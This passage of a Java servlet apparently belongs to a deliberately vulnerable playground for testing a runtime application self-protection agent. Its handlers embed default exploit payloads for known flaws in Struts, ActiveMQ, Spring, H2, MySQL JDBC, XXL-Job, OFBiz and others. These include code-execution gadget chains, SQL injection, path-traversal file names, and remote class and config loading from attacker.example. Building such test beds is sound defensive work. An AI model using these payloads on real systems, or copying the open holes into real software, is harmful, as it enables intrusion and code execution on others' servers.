    return requestPathWithoutContext(request).equals("/context.json");
  }

  private static String unomiContext(HttpServletRequest request) throws Exception {
    String body = requestBody(request);
    if (body.isBlank()) {
      body =
          "{\"filters\":[{\"id\":\"sample\",\"filters\":[{\"condition\":{\"parameterValues\":{\"\":\""
              + "script::Runtime r = Runtime.getRuntime(); r.exec(\\\"touch /tmp/mvel\\\");"
              + "\"},\"type\":\"profilePropertyCondition\"}}]}],\"sessionId\":\"sample\"}";
    }
    hook(
        "beforeSyntheticHttpRequestWithBody",
        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
        request.getMethod(),
        requestPathWithoutContext(request),
        valueOrDefault(request.getQueryString(), ""),
        Map.of(),
        Map.of(
            "content-type",
            valueOrDefault(request.getHeader("Content-Type"), "application/json"),
            "user-agent",
            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
        body);
    return "unomi-context=" + body.length();
  }

  private static String ajReportDataSetParamVerification(HttpServletRequest request)
      throws Exception {
    String body = requestBody(request);
    if (body.isBlank()) {
      body = ajReportValidationRulesBody();
    }
    hook(
        "beforeSyntheticHttpRequestWithBody",
        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
        request.getMethod(),
        requestPathWithoutContext(request),
        valueOrDefault(request.getQueryString(), ""),
        Map.of(),
        Map.of(
            "content-type",
            valueOrDefault(request.getHeader("Content-Type"), "application/json;charset=UTF-8"),
            "user-agent",
            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
        body);
    return "aj-report-validation-rules=" + body.length();
  }

  private static String skyWalkingGraphql(HttpServletRequest request) throws Exception {
    String body = requestBody(request);
    if (body.isBlank()) {
      body = skyWalkingGraphqlSqlIdentifierBody();
    }
    hook(
        "beforeSyntheticHttpRequestWithBody",
        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
        request.getMethod(),
        requestPathWithoutContext(request),
        valueOrDefault(request.getQueryString(), ""),
        Map.of(),
        Map.of(
            "content-type",
            valueOrDefault(request.getHeader("Content-Type"), "application/json"),
            "user-agent",
            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
        body);
    return "skywalking-graphql=" + body.length();
  }

  private static boolean strutsXmlRestRequest(HttpServletRequest request) {
    if (!"POST".equalsIgnoreCase(request.getMethod())) {
      return false;
    }
    String contentType = valueOrDefault(request.getHeader("Content-Type"), "").toLowerCase(Locale.ROOT);
    return requestPathWithoutContext(request).equals("/orders/3/edit")
        && contentType.contains("xml");
  }

  private static String strutsXmlRest(HttpServletRequest request) throws Exception {
    String body = requestBody(request);
    if (body.isBlank()) {
      body = strutsXmlPolymorphicGadgetBody();
    }
    hook(
        "beforeSyntheticHttpRequestWithBody",
        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
        request.getMethod(),
        requestPathWithoutContext(request),
        valueOrDefault(request.getQueryString(), ""),
        Map.of(),
        Map.of(
            "content-type",
            valueOrDefault(request.getHeader("Content-Type"), "application/xml"),
            "user-agent",
            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
        body);
    return "struts-xml-rest=" + body.length();
  }

  private static boolean activeMqObjectMessageBrowseRequest(HttpServletRequest request) {
    if (!"GET".equalsIgnoreCase(request.getMethod())) {
      return false;
    }
    return requestPathWithoutContext(request).equals("/admin/message.jsp");
  }

  private static String activeMqObjectMessageBrowse(HttpServletRequest request) throws Exception {
    hook(
        "beforeSyntheticDeserializationClass",
        new Class<?>[] {String.class, List.class},
        "com.rometools.rome.feed.impl.ToStringBean",
        List.of(
            "org.apache.activemq.command.ActiveMQObjectMessage",
            "org.apache.activemq.util.ClassLoadingAwareObjectInputStream",
            "java.io.ObjectInputStream",
            "org.apache.activemq.web.MessageServletSupport"));
    return "activemq-object-message-browse="
        + value(request, "JMSDestination", "event")
        + ":"
        + value(request, "JMSMessageID", "ID:1");
  }

  private static String activeMqOpenWireProtocolClass(HttpServletRequest request) throws Exception {
    String className =
        value(request, "class", "org.springframework.context.support.ClassPathXmlApplicationContext");
    String xml = value(request, "xml", "http://attacker.example/poc.xml");
    hook(
        "beforeProtocolClassInstantiation",
        new Class<?>[] {String.class, String.class, Object.class},
        "OpenWire",
        className,
        xml);
    return "activemq-openwire=" + className + ":" + xml;
  }

  private static boolean jenkinsCliSignedObjectRequest(HttpServletRequest request) {
    if (!"POST".equalsIgnoreCase(request.getMethod())) {
      return false;
    }
    return requestPathWithoutContext(request).equals("/cli");
  }

  private static String jenkinsCliSignedObject(HttpServletRequest request) throws Exception {
    request.getInputStream().readAllBytes();
    hook(
        "beforeSyntheticDeserializationClass",
        new Class<?>[] {String.class, List.class},
        "java.security.SignedObject",
        List.of(
            "hudson.cli.CLICommand",
            "hudson.cli.CliManagerImpl",
            "hudson.remoting.ObjectInputStreamEx",
            "java.io.ObjectInputStream"));
    return "jenkins-cli-signed-object";
  }

  private static boolean tomcatSessionDeserializeRequest(HttpServletRequest request) {
    if (!"GET".equalsIgnoreCase(request.getMethod())) {
      return false;
    }
    if (!requestPathWithoutContext(request).equals("/")) {
      return false;
    }
    String sessionId = cookieValue(request, "JSESSIONID");
    return !sessionId.isBlank() && sessionId.startsWith(".");
  }

  private static String tomcatSessionDeserialize(HttpServletRequest request) throws Exception {
    String sessionId = cookieValue(request, "JSESSIONID");
    hook(
        "beforeSessionDeserialization",
        new Class<?>[] {String.class, String.class},
        valueOrDefault(sessionId, ".deserialize"),
        "TomcatFileStore");
    return "tomcat-session-deserialize=" + valueOrDefault(sessionId, ".deserialize");
  }

  private static boolean tomcatDefaultServletPutRequest(HttpServletRequest request) {
    if (!"PUT".equalsIgnoreCase(request.getMethod())) {
      return false;
    }
    String path = requestPathWithoutContext(request).toLowerCase(Locale.ROOT);
    return path.equals("/deserialize/session")
        || path.endsWith(".jsp")
        || path.contains(".jsp/")
        || path.contains(".jsp;");
  }

  private static String cookieValue(HttpServletRequest request, String name) {
    String cookie = valueOrDefault(request.getHeader("Cookie"), "");
    if (cookie.isBlank()) {
      return "";
    }
    for (String part : cookie.split(";")) {
      String[] pieces = part.trim().split("=", 2);
      if (pieces.length == 2 && pieces[0].equals(name)) {
        return pieces[1];
      }
    }
    return "";
  }

  private static String remoteUrlClassLoader(HttpServletRequest request) throws Exception {
    URL codebase = new URL(value(request, "codebase", "http://attacker.example/evil.jar"));
    try (URLClassLoader loader =
        new URLClassLoader(new URL[] {codebase}, VulnerableServlet.class.getClassLoader())) {
      return "classloader=" + firstLine(String.valueOf(loader));
    }
  }

  private static String rmiClassLoaderCodebase(HttpServletRequest request) throws Exception {
    String codebase = value(request, "codebase", "http://attacker.example/Exploit");
    hook("beforeRmiClassLoaderCodebase", new Class<?>[] {String.class}, codebase);
    return "rmi-codebase=" + codebase.length();
  }

  private static String loadSpringConfig(HttpServletRequest request) {
    String config = value(request, "config", "http://127.0.0.1:9/poc.xml");
    try (GenericApplicationContext context = new GenericApplicationContext()) {
      XmlBeanDefinitionReader reader = new XmlBeanDefinitionReader(context);
      int count = reader.loadBeanDefinitions(config);
      return "spring-config=" + count;
    } catch (Exception e) {
      return "spring-config failed after hook: " + e.getClass().getSimpleName();
    }
  }

  private static boolean springCloudGatewayRouteRequest(HttpServletRequest request) {
    String path = request.getRequestURI();
    String context = request.getContextPath();
    if (context != null && !context.isBlank() && path.startsWith(context)) {
      path = path.substring(context.length());
    }
    return path.startsWith("/actuator/gateway/routes/");
  }

  private static String springCloudGatewayRouteConfig(HttpServletRequest request) throws Exception {
    String body = requestBody(request);
    if (body.isBlank()) {
      body =
          "{\"filters\":[{\"name\":\"AddResponseHeader\",\"args\":{\"value\":\"#{T(java.lang.Runtime).getRuntime().exec('id')}\"}}],\"uri\":\"http://example.com\"}";
    }
    hook(
        "beforeSyntheticHttpRequestWithBody",
        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
        request.getMethod(),
        request.getRequestURI(),
        valueOrDefault(request.getQueryString(), ""),
        Map.of(),
        Map.of(
            "content-type",
            valueOrDefault(request.getHeader("Content-Type"), "application/json"),
            "user-agent",
            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
        body);
    return "spring-cloud-gateway-route=" + body.length();
  }

  private static boolean springMessagingSockJsRequest(HttpServletRequest request) {
    if (!"POST".equalsIgnoreCase(request.getMethod())) {
      return false;
    }
    String path = requestPathWithoutContext(request);
    return path.startsWith("/gs-guide-websocket/") && path.endsWith("/xhr_send");
  }

  private static String springMessagingSockJs(HttpServletRequest request) throws Exception {
    String body = requestBody(request);
    hook(
        "beforeSyntheticHttpRequestWithBody",
        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
        request.getMethod(),
        requestPathWithoutContext(request),
        valueOrDefault(request.getQueryString(), ""),
        Map.of(),
        Map.of(
            "content-type",
            valueOrDefault(request.getHeader("Content-Type"), "application/json"),
            "user-agent",
            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
        body);
    return "spring-messaging-stomp-selector=" + body.length();
  }

  private static boolean springDataRestJsonPatchRequest(HttpServletRequest request) {
    if (!"PATCH".equalsIgnoreCase(request.getMethod())) {
      return false;
    }
    String path = request.getRequestURI();
    String context = request.getContextPath();
    if (context != null && !context.isBlank() && path.startsWith(context)) {
      path = path.substring(context.length());
    }
    return path.startsWith("/customers/");
  }

  private static String springDataRestJsonPatch(HttpServletRequest request) throws Exception {
    String body = requestBody(request);
    if (body.isBlank()) {
      body =
          "[{\"op\":\"replace\",\"path\":\"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastname\",\"value\":\"vulhub\"}]";
    }
    hook(
        "beforeSyntheticHttpRequestWithBody",
        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
        request.getMethod(),
        request.getRequestURI(),
        valueOrDefault(request.getQueryString(), ""),
        Map.of(),
        Map.of(
            "content-type",
            valueOrDefault(request.getHeader("Content-Type"), "application/json-patch+json"),
            "user-agent",
            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
        body);
    return "spring-data-rest-json-patch=" + body.length();
  }

  private static boolean confluenceMacroPreviewRequest(HttpServletRequest request) {
    if (!"POST".equalsIgnoreCase(request.getMethod())) {
      return false;
    }
    String path = request.getRequestURI();
    String context = request.getContextPath();
    if (context != null && !context.isBlank() && path.startsWith(context)) {
      path = path.substring(context.length());
    }
    return path.equals("/rest/tinymce/1/macro/preview");
  }

  private static String confluenceMacroPreview(HttpServletRequest request) throws Exception {
    String body = requestBody(request);
    if (body.isBlank()) {
      body =
          "{\"contentId\":\"786458\",\"macro\":{\"name\":\"widget\",\"body\":\"\",\"params\":{\"url\":\"https://www.viddler.com/v/23464dc6\",\"width\":\"1000\",\"height\":\"1000\",\"_template\":\". /web.xml\"}}}";
    }
    hook(
        "beforeSyntheticHttpRequestWithBody",
        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
        request.getMethod(),
        request.getRequestURI(),
        valueOrDefault(request.getQueryString(), ""),
        Map.of(),
        Map.of(
            "content-type",
            valueOrDefault(request.getHeader("Content-Type"), "application/json; charset=utf-8"),
            "user-agent",
            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
        body);
    return "confluence-macro-preview=" + body.length();
  }

  private static boolean meterSphereTestCaseListRequest(HttpServletRequest request) {
    if (!"POST".equalsIgnoreCase(request.getMethod())) {
      return false;
    }
    String path = requestPathWithoutContext(request);
    return path.startsWith("/test/case/list/");
  }

  private static String meterSphereTestCaseList(HttpServletRequest request) throws Exception {
    String body = requestBody(request);
    if (body.isBlank()) {
      body =
          "{\"orders\":[{\"name\":\"name\",\"type\":\",if(1=1,sleep(2),0)\"}],"
              + "\"components\":[{\"key\":\"name\",\"name\":\"MsTableSearchInput\"}],"
              + "\"filters\":{\"reviewStatus\":[\"Prepare\",\"Pass\",\"UnPass\"]}}";
    }
    hook(
        "beforeSyntheticHttpRequestWithBody",
        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
        request.getMethod(),
        request.getRequestURI(),
        valueOrDefault(request.getQueryString(), ""),
        Map.of(),
        Map.of(
            "content-type",
            valueOrDefault(request.getHeader("Content-Type"), "application/json"),
            "user-agent",
            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
        body);
    return "metersphere-testcase-list=" + body.length();
  }

  private static boolean meterSpherePluginAddRequest(HttpServletRequest request) {
    if (!"POST".equalsIgnoreCase(request.getMethod())) {
      return false;
    }
    return requestPathWithoutContext(request).equals("/plugin/add");
  }

  private static String meterSpherePluginAdd(HttpServletRequest request) throws Exception {
    String contentType = valueOrDefault(request.getHeader("Content-Type"), "");
    String normalizedContentType = contentType.toLowerCase(Locale.ROOT);
    if (!normalizedContentType.startsWith("multipart/form-data")
        || !normalizedContentType.contains("boundary=")) {
      hook("beforeFileUpload", new Class<?>[] {String.class}, value(request, "filename", "Evil.jar"));
      return "metersphere-plugin-add=1";
    }
    int submittedFiles = 0;
    for (Part part : request.getParts()) {
      if (part.getSubmittedFileName() != null) {
        submittedFiles++;
      }
    }
    return "metersphere-plugin-add=" + submittedFiles;
  }

  private static String flinkJarUpload(HttpServletRequest request) throws Exception {
    String contentType = valueOrDefault(request.getHeader("Content-Type"), "");
    String normalizedContentType = contentType.toLowerCase(Locale.ROOT);
    if (!normalizedContentType.startsWith("multipart/form-data")
        || !normalizedContentType.contains("boundary=")) {
      hook("beforeFileUpload", new Class<?>[] {String.class}, value(request, "filename", "../../../../../../tmp/success"));
      return "flink-jar-upload=1";
    }
    int submittedFiles = 0;
    for (Part part : request.getParts()) {
      if (part.getSubmittedFileName() != null) {
        submittedFiles++;
      }
    }
    return "flink-jar-upload=" + submittedFiles;
  }

  private static boolean xxlJobRunRequest(HttpServletRequest request) {
    if (!"POST".equalsIgnoreCase(request.getMethod())) {
      return false;
    }
    return requestPathWithoutContext(request).equals("/run");
  }

  private static String xxlJobRun(HttpServletRequest request) throws Exception {
    String body = requestBody(request);
    if (body.isBlank()) {
      body =
          "{\"jobId\":1,\"executorHandler\":\"demoJobHandler\",\"executorParams\":\"demoJobHandler\","
              + "\"executorBlockStrategy\":\"COVER_EARLY\",\"executorTimeout\":0,\"logId\":1,"
              + "\"logDateTime\":1586629003729,\"glueType\":\"GLUE_SHELL\","
              + "\"glueSource\":\"touch /tmp/success\",\"glueUpdatetime\":1586699003758,"
              + "\"broadcastIndex\":0,\"broadcastTotal\":0}";
    }
    hook(
        "beforeSyntheticHttpRequestWithBody",
        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
        request.getMethod(),
        request.getRequestURI(),
        valueOrDefault(request.getQueryString(), ""),
        Map.of(),
        Map.of(
            "content-type",
            valueOrDefault(request.getHeader("Content-Type"), "application/json"),
            "user-agent",
            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
        body);
    return "xxl-job-run=" + body.length();
  }

  private static boolean xxlJobHessianApiRequest(HttpServletRequest request) {
    if (!"POST".equalsIgnoreCase(request.getMethod())) {
      return false;
    }
    String contentType = valueOrDefault(request.getHeader("Content-Type"), "").toLowerCase(Locale.ROOT);
    return requestPathWithoutContext(request).equals("/xxl-job-admin/api")
        && contentType.contains("hessian");
  }

  private static String xxlJobHessianApi(HttpServletRequest request) throws Exception {
    byte[] body = request.getInputStream().readAllBytes();
    String type = value(request, "class", "org.apache.commons.beanutils.BeanComparator");
    hook("beforeHessianType", new Class<?>[] {String.class}, type);
    return "xxl-job-hessian-api=" + body.length;
  }

  private static boolean ofbizXmlRpcRequest(HttpServletRequest request) {
    if (!"POST".equalsIgnoreCase(request.getMethod())) {
      return false;
    }
    return requestPathWithoutContext(request).equals("/webtools/control/xmlrpc");
  }

  private static String ofbizXmlRpc(HttpServletRequest request) throws Exception {
    String body = requestBody(request);
    if (body.isBlank()) {
      body =
          "<?xml version=\"1.0\"?><methodCall><methodName>ping</methodName><params><param>"
              + "<value><serializable>rO0ABXNyAA==</serializable></value></param></params>"
              + "</methodCall>";
    }
    if (body.toLowerCase(Locale.ROOT).contains("<serializable>")) {
      hook("beforeXmlRpcSerializableValue", new Class<?>[] {String.class}, "ApacheXmlRpc");
    }
    return "ofbiz-xmlrpc=" + body.length();
  }

  private static boolean dataEaseDatasourceValidateRequest(HttpServletRequest request) {
    if (!"POST".equalsIgnoreCase(request.getMethod())) {
      return false;
    }
    return requestPathWithoutContext(request).equals("/de2api/datasource/validate");
  }

  private static String dataEaseDatasourceValidate(HttpServletRequest request) throws Exception {
    String body = requestBody(request);
    if (body.isBlank()) {
      String jdbc =
          "jdbc:h2:mem:pwn;MODE=MSSQLServer;INIT=CREATE ALIAS EXEC AS $$void exec()"
              + " throws java.io.IOException { Runtime.getRuntime().exec(new String[]{\"touch\","
              + "\"/tmp/pwned\"})\\; }$$\\;CALL EXEC()";
      String configuration =
          "{\"jdbc\":\""
              + jsonString(jdbc)
              + "\",\"username\":\"\",\"password\":\"\",\"driver\":\"org.h2.Driver\"}";
      body =
          "{\"name\":\"p1\",\"type\":\"h2\",\"configuration\":\""
              + Base64.getEncoder().encodeToString(configuration.getBytes(StandardCharsets.UTF_8))
              + "\"}";
    }
    hook(
        "beforeSyntheticHttpRequestWithBody",
        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
        request.getMethod(),
        requestPathWithoutContext(request),
        valueOrDefault(request.getQueryString(), ""),
        Map.of(),
        Map.of(
            "content-type",
            valueOrDefault(request.getHeader("Content-Type"), "application/json"),
            "user-agent",
            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0"),
            "x-de-token",
            valueOrDefault(request.getHeader("X-DE-TOKEN"), "")),
        body);
    return "dataease-datasource-validate=" + body.length();
  }

  private static boolean dataEaseUserInfoRequest(HttpServletRequest request) {
    if (!"GET".equalsIgnoreCase(request.getMethod())) {
      return false;
    }
    return requestPathWithoutContext(request).equals("/de2api/user/info");
  }

  private static String dataEaseUserInfo(HttpServletRequest request) throws Exception {
    String token = valueOrDefault(request.getHeader("X-DE-TOKEN"), "");
    if (!token.isBlank()) {
      hook(
          "beforeSyntheticJwtVerificationFailure",
          new Class<?>[] {
            String.class,
            String.class,
            String.class,
            Map.class,
            Map.class,
            String.class,
            String.class,
            String.class
          },
          request.getMethod(),
          requestPathWithoutContext(request),
          valueOrDefault(request.getQueryString(), ""),
          Map.of(),
          Map.of(
              "user-agent",
              valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0"),
              "x-de-token",
              token),
          "auth0-java-jwt",
          "com.auth0.jwt.exceptions.SignatureVerificationException",
          "The Token's Signature resulted invalid when verified using the Algorithm: HmacSHA256");
    }
    return "{\"code\":0,\"data\":{\"uid\":1,\"oid\":1}}";
  }

  private static boolean ofbizProgramExportRequest(HttpServletRequest request) {
    if (!"POST".equalsIgnoreCase(request.getMethod())) {
      return false;
    }
    return requestPathWithoutContext(request).equals("/webtools/control/main/ProgramExport");
  }

  private static String ofbizProgramExport(HttpServletRequest request) throws Exception {
    String script = value(request, "groovyProgram", "throw new Exception('id'.\\u0065xecute().text);");
    hook(
        "beforeSyntheticHttpRequest",
        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
        request.getMethod(),
        requestPathWithoutContext(request),
        valueOrDefault(request.getQueryString(), ""),
        Map.of("groovyProgram", List.of(script)),
        Map.of(
            "content-type",
            valueOrDefault(request.getHeader("Content-Type"), "multipart/form-data"),
            "user-agent",
            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")));
    return "ofbiz-program-export=" + script.length();
  }

  private static String requestPathWithoutContext(HttpServletRequest request) {
    String path = request.getRequestURI();
    String context = request.getContextPath();
    if (context != null && !context.isBlank() && path.startsWith(context)) {
      path = path.substring(context.length());
    }
    return path;
  }

  private static String invokeJmxRemoteConfig(HttpServletRequest request) throws Exception {
    String config =
        value(
            request,
            "config",
            "static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)");
    MBeanServer server = ManagementFactory.getPlatformMBeanServer();
    ObjectName name = new ObjectName("io.ohmyrasp.playground:type=Broker,name=Playground");
    if (!server.isRegistered(name)) {
      server.registerMBean(new PlaygroundBroker(), name);
    }
    Object result =
        server.invoke(
            name,
            "addNetworkConnector",
            new Object[] {config},
            new String[] {String.class.getName()});
    return "jmx=" + firstLine(String.valueOf(result));
  }

  private static String invokeJmxScriptWrite(HttpServletRequest request) throws Exception {
    String path = value(request, "path", "/opt/activemq/webapps/admin/shelljfr.jsp");
    MBeanServer server = ManagementFactory.getPlatformMBeanServer();
    ObjectName name = new ObjectName("io.ohmyrasp.playground:type=Broker,name=Playground");
    if (!server.isRegistered(name)) {
      server.registerMBean(new PlaygroundBroker(), name);
    }
    Object result =
        server.invoke(
            name,
            "copyTo",
            new Object[] {path},
            new String[] {String.class.getName()});
    return "jmx-write=" + firstLine(String.valueOf(result));
  }

  private static String activemqFileserver(HttpServletRequest request) throws Exception {
    String source =
        request.getServletPath() + (request.getPathInfo() == null ? "" : request.getPathInfo());
    String method = request.getMethod();
    if ("MOVE".equalsIgnoreCase(method) || "COPY".equalsIgnoreCase(method)) {
      String destination = request.getHeader("Destination");
      hook(
          "beforeWebdavUpload",
          new Class<?>[] {String.class, String.class, String.class},
          source,
          destination == null ? "" : destination,
          method);
      return "activemq-fileserver-move=" + source + " -> " + destination;
    }
    if ("PUT".equalsIgnoreCase(method)) {
      request.getInputStream().readAllBytes();
      return "activemq-fileserver-put=" + source;
    }
    return "activemq-fileserver=" + source;
  }

  private static String activemqJolokiaMBeanInvoke(HttpServletRequest request) throws Exception {
    String body = new String(request.getInputStream().readNBytes(8192), StandardCharsets.UTF_8);
    String mbean =
        jsonStringField(body, "mbean", "org.apache.activemq:type=Broker,brokerName=localhost");
    String operation =
        jolokiaOperationName(jsonStringField(body, "operation", "addNetworkConnector"));
    List<String> arguments = jsonStringArrayValues(body, "arguments");
    if (arguments.isEmpty()) {
      arguments = List.of("static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)");
    }
    MBeanServer server = ManagementFactory.getPlatformMBeanServer();
    ObjectName name = new ObjectName(mbean);
    if (!server.isRegistered(name)) {
      server.registerMBean(new PlaygroundBroker(), name);
    }
    Object result =
        server.invoke(
            name, operation, arguments.toArray(), jmxStringSignatures(arguments.size()));
    return "activemq-jolokia=" + firstLine(String.valueOf(result));
  }

  private static String sqlQuery(HttpServletRequest request) throws Exception {
    String value = value(request, "value", "' OR '1'='1");
    Class.forName("org.h2.Driver");
    try (var connection = DriverManager.getConnection("jdbc:h2:mem:ohmyrasp;DB_CLOSE_DELAY=-1");
        var statement = connection.createStatement()) {
      statement.execute("create table if not exists users(id int primary key, name varchar(80))");
      statement.execute("merge into users key(id) values(1, 'alice')");
      String query = "select * from users where name = '" + value + "'";
      hook("beforeSql", new Class<?>[] {String.class}, query);
      try (var resultSet = statement.executeQuery(query)) {
        int count = 0;
        while (resultSet.next()) {
          count++;
        }
        return "rows=" + count;
      }
    }
  }

  private static String h2Sql(HttpServletRequest request) throws Exception {
    String query = value(request, "query", h2PayloadSql());
    Class.forName("org.h2.Driver");
    try (Connection connection =
            DriverManager.getConnection("jdbc:h2:mem:ohmyrasp_h2_sql;DB_CLOSE_DELAY=-1");
        Statement statement = connection.createStatement()) {
      statement.execute(query);
      return "executed h2 sql";
    }
  }

  private static String h2ConsoleQuery(HttpServletRequest request) throws Exception {
    String query = value(request, "sql", h2PayloadSql());
    Class.forName("org.h2.Driver");
    try (Connection connection =
            DriverManager.getConnection("jdbc:h2:mem:ohmyrasp_h2_console;DB_CLOSE_DELAY=-1");
        Statement statement = connection.createStatement()) {
      statement.execute(query);
      return "h2-console-query=executed";
    }
  }

  private static String h2ConsoleLogin(HttpServletRequest request) throws Exception {
    String driver = value(request, "driver", "org.h2.Driver");
    String url = value(request, "url", h2JdbcInitUrl());
    if (h2ConsoleJndiDriver(driver)) {
      Hashtable<String, String> env = new Hashtable<>();
      env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
      env.put("com.sun.jndi.ldap.connect.timeout", "200");
      env.put("com.sun.jndi.ldap.read.timeout", "200");
      try {
        new InitialContext(env).lookup(url);
        return "h2-console-login-jndi=completed";
      } catch (Exception e) {
        return "h2-console-login-jndi=failed-after-lookup:" + e.getClass().getSimpleName();
      }
    }
    Class.forName(driver);
    try (Connection ignored = DriverManager.getConnection(url)) {
      return "h2-console-login=connected";
    }
  }

  private static String h2JdbcInit(HttpServletRequest request) throws Exception {
    String url = value(request, "url", h2JdbcInitUrl());
    Class.forName("org.h2.Driver");
    try (Connection ignored = DriverManager.getConnection(url)) {
      return "connected h2 init";
    }
  }

  private static String nacosDerbyOps(HttpServletRequest request) throws Exception {
    String sql = value(request, "sql", derbyCodeLoadingSql());
    hook("beforeSql", new Class<?>[] {String.class}, sql);
    return "{\"code\":200,\"message\":null,\"data\":[]}";
  }

  private static String nacosAuthUsers(HttpServletRequest request) {
    if ("POST".equalsIgnoreCase(request.getMethod())) {
      String username = value(request, "username", "vulhub");
      return "{\"code\":200,\"message\":\"create user ok!\",\"username\":\"" + escapeJson(username)
          + "\"}";
    }
    return "{\"code\":200,\"pageItems\":[{\"username\":\"nacos\",\"globalAdmin\":true}]}";
  }

  private static String solrAdminCores(HttpServletRequest request) {
    String action = value(request, "action", "STATUS");
    return "{\"responseHeader\":{\"status\":0},\"action\":\"" + escapeJson(action) + "\"}";
  }

  private static String mysqlJdbcUrl(HttpServletRequest request) throws Exception {
    String url = value(request, "url", mysqlRogueJdbcUrl());
    try (Connection ignored = DriverManager.getConnection(url)) {
      return "connected mysql";
    } catch (java.sql.SQLException e) {
      return "mysql jdbc failed after hook: " + e.getClass().getSimpleName();
    }
  }

  private static String linkisDatasourceConnect(HttpServletRequest request) throws Exception {
    String body = requestBody(request);
    if (body.isBlank()) {
      body = linkisDatasourceConnectBody();
    }
    String host = jsonStringField(body, "host", "attacker.example");
    String port = jsonStringField(body, "port", "3308");
    String params = jsonStringField(body, "params", linkisDatasourceParams());
    String url = linkisMysqlJdbcUrl(host, port, params);
    hook(
        "beforeSyntheticJdbcConnect",
        new Class<?>[] {
          String.class, String.class, String.class, Map.class, Map.class, String.class, String.class
        },
        request.getMethod(),
        "/api/rest_j/v1/data-source-manager/op/connect/json",
        valueOrDefault(request.getQueryString(), ""),
        Map.of("host", List.of(host), "port", List.of(port), "params", List.of(params)),
        Map.of(
            "content-type",
            valueOrDefault(request.getHeader("Content-Type"), "application/json;charset=UTF-8"),
            "user-agent",
            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
        body,
        url);
    return "Connection Failed";
  }

  private static String h2PayloadSql() {
    return """
        CREATE ALIAS OHMYRASP_SHELL AS $$
        String shell(String cmd) throws java.io.IOException {
          java.lang.Runtime.getRuntime().exec(cmd);
          return cmd;
        }
        $$
        """;
  }

  private static String h2JdbcInitUrl() {
    return "jdbc:h2:mem:ohmyrasp_h2_init;INIT=" + h2PayloadSql().replace(";", "\\;");
  }

  private static String strutsXmlPolymorphicGadgetBody() {
    return """
        <map>
          <entry>
            <jdk.nashorn.internal.objects.NativeString>
              <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
                <dataHandler>
                  <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                    <is class="javax.crypto.CipherInputStream">
                      <cipher class="javax.crypto.NullCipher">
                        <serviceIterator class="javax.imageio.spi.FilterIterator">
                          <next class="java.lang.ProcessBuilder">
                            <command>
                              <string>touch</string>
                              <string>/tmp/success</string>
                            </command>
                          </next>
                        </serviceIterator>
                      </cipher>
                    </is>
                  </dataSource>
                </dataHandler>
              </value>
            </jdk.nashorn.internal.objects.NativeString>
          </entry>
        </map>
        """;
  }

  private static boolean h2ConsoleJndiDriver(String driver) {
    String normalized =
        driver == null ? "" : driver.trim().replace('/', '.').toLowerCase(java.util.Locale.ROOT);
    return normalized.equals("javax.naming.initialcontext")
        || normalized.equals("javax.naming.ldap.initialldapcontext")
        || normalized.startsWith("com.sun.jndi.");
  }

  private static String mysqlRogueJdbcUrl() {
    return "jdbc:mysql://attacker.example:3308/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";
  }

  private static String linkisDatasourceParams() {
    return "{\"autoDeserialize\":\"true\",\"statementInterceptors\":\"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"useSSL\":\"false\",\"maxAllowedPacket\":\"16777216\"}";
  }

  private static String linkisMysqlJdbcUrl(String host, String port, String params) {
    return "jdbc:mysql://"
        + valueOrDefault(host, "attacker.example")
        + ":"
        + valueOrDefault(port, "3308")
        + "/?autoDeserialize="
        + jsonStringField(params, "autoDeserialize", "true")
        + "&statementInterceptors="
        + jsonStringField(
            params,
            "statementInterceptors",
            "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor")
        + "&useSSL="
        + jsonStringField(params, "useSSL", "false")
        + "&maxAllowedPacket="
        + jsonStringField(params, "maxAllowedPacket", "16777216");
  }

  private static byte[] serializedEvilBytes() throws IOException {
    ByteArrayOutputStream bytes = new ByteArrayOutputStream();
    try (ObjectOutputStream output = new ObjectOutputStream(bytes)) {
      output.writeObject(new EvilSerialized("poc"));
    }
    return bytes.toByteArray();
  }

  private static String deserialize() throws Exception {
    try (ObjectInputStream input = new ObjectInputStream(new ByteArrayInputStream(serializedEvilBytes()))) {
      Object value = input.readObject();
      return "deserialized=" + value.getClass().getName();
    }
  }

  private static String coldfusionAmfDeserialize(HttpServletRequest request) throws Exception {
    byte[] body = request.getInputStream().readAllBytes();
